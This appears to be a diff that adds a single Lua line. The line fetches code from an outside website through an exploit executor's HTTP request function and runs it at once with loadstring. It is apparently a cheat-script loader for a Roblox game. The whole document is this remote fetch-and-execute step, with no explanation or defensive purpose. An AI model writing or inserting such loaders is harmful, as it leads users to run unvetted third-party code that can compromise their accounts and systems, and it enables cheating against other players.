@@ -1,0 +1,1 @@
+loadstring(((syn and syn.request) or request or http_request)({Url = "https://www.stenutilities.com/babft"})["Body"])()
